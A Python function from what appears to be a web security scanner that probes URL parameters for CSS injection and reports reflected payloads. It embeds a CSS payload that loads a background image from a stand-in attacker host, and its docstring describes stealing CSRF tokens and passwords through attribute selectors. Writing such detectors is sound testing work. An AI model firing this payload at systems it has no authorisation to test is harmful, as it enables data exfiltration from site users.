import requests
import re
from rich.console import Console
import urllib.parse

console = Console()

def check_css_exfiltration(url, headers=None):
    """
    Blind CSS Injection & Exfiltration Scanner.
    Detects if an endpoint reflects user input into a <style> block or allows
    injecting arbitrary CSS. This can be used to steal CSRF tokens, passwords, 
    or PII via CSS attribute selectors (e.g., input[value^="a"] { background: url(...) }).
    """
    console.print(f"[bold cyan][*] Scanning for Blind CSS Exfiltration / Injection: {url}[/bold cyan]")
    findings = []
    
    # Payload designed to test if we can inject a background-image URL
    # that calls back to our server based on an attribute selector.
    css_payload = "} * { background-image: url('http://evil-attacker.com/css_leak_test'); } /*"
    
    # We will test appending this payload to query parameters
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    
    if not qs:
        # If no query params, we test appending a dummy param
        test_urls = [f"{url}?theme={urllib.parse.quote(css_payload)}"]
    else:
        test_urls = []
        for param in qs:
            new_qs = qs.copy()
            new_qs[param] = css_payload
            new_query_string = urllib.parse.urlencode(new_qs, doseq=True)
            test_urls.append(urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query_string, parsed.fragment)))
            
    for test_url in test_urls:
        try:
            r = requests.get(test_url, headers=headers, timeout=5)
            
            # Check if our payload is reflected unsanitized inside a <style> tag or CSS context
            if css_payload in r.text:
                # Basic heuristic: Check if it's near a <style> or inside CSS
                if re.search(r'<style[^>]*>.*?' + re.escape(css_payload), r.text, flags=re.IGNORECASE | re.DOTALL):
                    console.print(f"[bold red][!] CRITICAL: Blind CSS Injection detected![/bold red]")
                    console.print(f"[bold red]    Payload reflected inside <style> tags at: {test_url}[/bold red]")
                    console.print(f"[bold red]    This can lead to data exfiltration via CSS Attribute Selectors.[/bold red]")
                    findings.append(f"CSS Injection: {test_url}")
                elif "text/css" in r.headers.get("Content-Type", ""):
                    console.print(f"[bold red][!] CRITICAL: Direct CSS Injection detected![/bold red]")
                    console.print(f"[bold red]    Endpoint returns Content-Type: text/css with payload reflected.[/bold red]")
                    findings.append(f"CSS Injection (Direct): {test_url}")
        except:
            pass
            
    if not findings:
        console.print("[green][+] No CSS Injection vulnerabilities detected.[/green]")
        
    return findings
